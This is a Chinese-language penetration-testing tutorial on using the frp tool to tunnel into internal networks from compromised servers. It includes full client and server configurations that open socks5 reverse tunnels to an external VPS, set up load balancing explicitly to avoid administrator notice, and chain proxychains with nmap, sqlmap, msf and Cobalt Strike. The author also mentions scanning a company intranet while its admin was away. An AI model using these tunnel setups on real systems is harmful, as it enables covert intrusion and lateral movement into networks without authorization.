模拟一下场景，首先对于目标来说，有很多的子域名，这些子域名解析为内网 IP 地址，我们在得到一台服务器权限后，通过扫描 53 端口或其他手段找到了内网的
DNS 服务器，接下来我们将 DNS 解析指到内网服务器上，因此我们就可以通过域名访问内网服务器，也可以指定 DNS 服务器进行子域名爆破，来发现更多的资产
用于测试的内网 DNS 服务器为 10.10.100.132，将多个
baidu.com的子域名解析到了内网地址，而被入侵的服务器没有指定这个DNS，我们需要扫描端口发现 DNS 服务器，然后进行 DNS 解析指定及子域名爆破
首先对内目标网段的 53 端口进行扫描探测，扫描端口使用 TCP 协议就可以，所以先使用原先的代理扫描，这部分比较简单就不截图了
然后再客户端添加配置，重新启动服务：
    [dns]
    type = udp
    local_ip = 10.10.100.132
    local_port = 53
    remote_port = 40053
    use_encryption = true
    use_compression = true
使用 dig 命令测试一下对 www.baidu.com 的解析，可以看得到域名成功解析到我们设定的 10.10.232.22，证明内网代理成功
直接现场造个玩具车轮子指定DNS服务器查询子域名：
可以看到一些在内网DNS服务器上事先设置好的子域名如 vpn/oa/test/admin/mail/m 等等被解析到了内网IP地址中
###  3.点对点( stcp 与 xtcp )
安全地暴露内网服务（secret tcp）以及 xtcp
都是frp提供的点对点传输服务，xtcp用于应对在希望传输大量数据且流量不经过服务器的场景，这就直接是一个 p2p 的隧道
根据官方文档，这种协议不能穿透所有类型的 NAT 设备，所以穿透成功率较低。穿透失败时可以尝试 stcp 的方式
其实 stcp 就相当于再添加一次认证，改一次配置文件即可，我们直接测试一下 xtcp
服务器端添加UDP绑定端口：
    bind_udp_port = 7001
客户端1（被入侵的服务器）配置文件：
    [common]
    server_addr = 103.242.135.137
    server_port = 7000
    tls_enable = true
    pool_count = 5
    [p2p_socks]
    type = xtcp
    remote_port = 46075
    sk = HjnllUwX5WiRD5Ij
    plugin = socks5
客户端2（攻击者电脑—我的mac）配置文件：
    [common]
    server_addr = 103.242.135.137
    server_port = 7000
    tls_enable = true
    pool_count = 5
    [p2p_socks_visitor]
    type = xtcp
    role = visitor
    server_name = p2p_socks
    sk = HjnllUwX5WiRD5Ij
    bind_addr = 127.0.0.1
    bind_port = 1086
激动人心的时刻到了
没错，报了一屏幕的 i/o timeout
惊不惊喜，意不意外
frp 所谓的 xtcp 协议，应用的应该是一个 UDP 打洞的过程（瞎猜的，反正也懒得看源码，看也看不懂）
过程：
> 1、准备一台服务器，放在公网上，与客户端甲和乙通信，记录客户端甲和乙的 IP
> 和端口信息，这些IP和端口并非甲和乙在内网的IP和端口，而是通过NAT方式映射到路由器上的IP和端口。  
>  2、客户端甲向服务器发送udp消息，请求和客户端乙通信。  
>  3、服务器向客户端甲发送消息，消息内容包含客户端乙的IP和端口信息。  
>  4、服务器向客户端乙发送消息，消息内容包含客户端甲的IP和端口信息。  
>  5、客户端甲根据3步骤获得的信息向客户端乙发送udp消息，同一时刻客户端乙根据3步骤获得的信息向客户端甲发送udp消息，尝试多次，udp打洞就能成功。
这种打洞只支持 ConeNAT（锥形 NAT），不支持 Symmetric NAT （对称NAT），因此没办法能够支持全部的
NAT方式，更何况，你知道你在访问公网的时候中间经过了多少层 NAT 吗，因此这项功能不用纠结，不好用就不好用，静待更好的解决方案。
###  4.负载均衡
如果我们在内网拿到了多台能够访问互联网机器，可以启用多台客户端，进行负载均衡，毕竟突然从一台机器迸发出大量流量很容易引起管理员的注意，也可以负载分担一下机器的CPU资源消耗
目前只支持 TCP 和 HTTP 类型的 proxy，但是之前说过，作为web狗完全够用
我们使用两台被入侵的服务器作为负载均衡，IP分别为 10.10.99.33 和 10.10.100.81
服务器一、二配置相同：
    [common]
    # 远程VPS地址
    server_addr = 103.242.135.137
    server_port = 7000
    tls_enable = true
    pool_count = 5
    [plugin_socks]
    # [plugin_socks_2]
    type = tcp
    remote_port = 46075
    plugin = socks5
    plugin_user = joseph
    plugin_passwd = bnbm#yBZ90ad
    use_encryption = true
    use_compression = true
    group = socks_balancing
    group_key = NGbB5#8n
这部分相同的点是 group/group_key/remote_port，两台服务器名是不同的
部署完成后可以在管理端看到这两个插件
再次连接代理时，可以发现两个客户端都产生了流量
我们再设置一台web应用服务器，IP地址为 10.10.100.135
在浏览器中打开网址并多次刷新，在 apache 的日志中发现了来自两个IP的访问
这说明负载均衡的功能是好用的，很强势
###  5.其他功能
转发 Unix 域套接字：单个主机通信协议，一般用不上
对外提供文件访问服务：这估计是渗透测试工程师最不需要的功能
http转https：没用
加密与压缩：这两个功能可以看到我都启用了
TLS加密：这个我也开了，安全性更高
客户端UI/热加载配置/查看状态：普通情况下是可以不用的，但是前期资产发现过程需要多次配置的情况，或者上线新机器做负载均衡的时候可以使用，不过热加载还是需要等一段时间才能够生效，性子急的我表示等不了
端口白名单：这里我指定了 40000-50000
web相关的：很多功能是为了将内网web转至公网，对我们来讲基本不用
通过代理连接 frps：在特殊情况下可能是有用的，但是暂时没用
范围端口映射：这个貌似也没什么用
子域名：在找到内网DNS解析服务器的情况下可以不进行配置，如果没找到，但是知道内网 IP
和域名的对应关系，且服务器只可以通过域名访问的情况下可以使用这项配置，但我觉得都不如绑个host来的快
KCP协议：KCP是一个快速可靠协议，能以比 TCP浪费10%-20%的带宽的代价，换取平均延迟降低
30%-40%，且最大延迟降低三倍的传输效果，在带宽很足但延迟较高的情况下可以使用 kcp 协议进行数据通信，未测试
等等
## 五、性能测试
性能测试，将使用 socks5 协议进行代理，nmap 扫描内网 C 段全端口，以及 SQLMAP level 5 risk 3 threads 10
对内网漏洞靶场进行 sql 注入测试。使用两台内网服务器进行负载均衡，来测试一下速度和准确性
###  1\. NMAP 扫描全端口测试
proxychains + nmap 扫 10.10.100.0/24 全端口
因为 socks 协议没法代理 icmp ，因此 nmap 参数使用了 -Pn 避免 nmap 使用 ping 来检测主机存活，nmap
会无论是否有存活主机均扫描完全部的端口
对于不存在的主机 nmap 的速度大概在 3分半 一台机，
将这个完整的网段扫完，大概需要两天的时间，感觉速度还是可以接受的
趁着公司网管出差扫了一波内网美滋滋，要不然分分钟被封
###  2\. SQLMAP 完全体注入测试
使用内网 mongodb 的注入靶场试试
SQLMAP自带设置代理的选项，我们添加一些参数，然后进行测试
设置代理
GO~
流量也成功被负载
因为我的上行网速确实是感人，我还开了网易云音乐，所以客观上速度确实慢点
从开始到结束一共耗时 3 个小时左右，因为 sqlmap 不支持 mongodb，所以没有结果
这个速度，额。。。。
## 六、配合性测试
对内网进行信息探测时，简直是八仙过海各显神通，每位渗透测试工程师，每个团队都有自己常用的手段，内网穿透的方式也不同，所以各位看官在将 frp
用于实际工作中之前一定要自测，是否满足自己的习惯。
在最近几次 HW 中，见到非常多的队伍在拿到服务器权限后，将自己的工具包直接拖到入侵的服务器上，各种小工具，各种exe，扫端口的，扫 IIS PUT 的，扫
17010 的等等，说真的，我都偷偷保存下来，搜集了不少，哈哈哈
不是说这种方式不行，而是太不优雅了，不符合一天要敷8张面膜的妮妮尔优雅大使洛洛梨的典雅气质（能看懂这句话的都是变态QAQ），因此我们通常使用一些后渗透测试框架进行集中管理，比如
CS msf 等
如果我们希望使用 CS 进行总控，frp 作为数据通信隧道，使用msf进行攻击，其实也可以实现
接下来再模拟一个场景，我们拿到一台服务器，CS 上线，使用 frp 隧道建立连接，msf 使用 frp 隧道进行攻击，获取 session 后再转给 CS
，很简单的过程
frp 服务端地址：103.242.135.137
CS 服务端地址：144.48.9.229
被入侵的第一台服务器地址：10.10.99.33
第二台被入侵服务器地址： 192.168.88.85（虚拟机）
首先得到第一台被入侵服务器的权限，设置 frp 客户端
配置 frp 服务端：
    [common]
    bind_addr = 0.0.0.0
    bind_port = 7000
    bind_udp_port = 7001
    dashboard_port = 7500
    dashboard_user = su18
    dashboard_pwd = X758@Kp9eG1xzyYS
配置 frp 客户端：
    [common]
    server_addr = 103.242.135.137
    server_port = 7000
    tls_enable = true
    pool_count = 5
    [plugin_socks]
    type = tcp
    remote_port = 46075
    plugin = socks5
    use_encryption = true
    use_compression = true
    group = socks_balancing
    group_key = NGbB5#8n
配置成功后可以看到线上出现一台代理
接下来使用 proxychains + msf 进行组合攻击，再将 session 转到 cs 中，套路比较常见无需多言，也就没截图
我们直接跳到 CS 2.6 管理界面（实际上就是 Armitage ），如下图，不小心点了一下 ARP 探测
再次现场造一个玩具车轮子，这次是 cs的插件，简单造一个
导入插件，并选择
配置保持一致：
执行，在服务端上可看到成功启动负载均衡
对于 3.X 版的 CS 脚本在 Github 上可以找到，未进行测试：
那为什么有了 CS 和 msf 还要用 frp 呢？第一是负载均衡的功能，第二是网络连接速度的问题，利和弊各位自己测试及衡量
另外 CS 新版本不支持 msf ，旧版本支持，如果你喜欢折腾，可以旧版本 CS + MSF 获取权限，新版本 CS 维持权限，frp
内网穿透，proxychains 代理服务，这一套操作下来，你就发现自己有点像电影里的“黑客”了
## 七、总结
由于本人最常用reGeorg，所以将这两者进行着重的对比，虽然两者实现方式不同，本质上没什么可比性，还是就几个方面罗列一下差别
在利用难度上，对于reGeorg来说，只需要获取网站的文件上传权限即可，对于 frp 来说，需要服务器的执行命令权限
在环境限制上，frp 要求入侵服务器能够访问外部网络，reGeorg 则不需要，frp 需要一台公网IP的服务器运行服务端，reGeorg
也不需要，就如同正反向 shell 的差别
在功能上，frp 提供繁多功能，满足不同的需求，reGeorg 简直弱爆了
在性能上，但从 frp 支持负载均衡和点对点传输上简直完爆其他内网穿透工具了，真的，性能自然不必多说
至于其他类别的内网穿透，利与弊各位自己衡量，感觉单看内网穿透这个功能可能是目前地表最强了（仅个人观点）~
总体来讲，很强的一款代理工具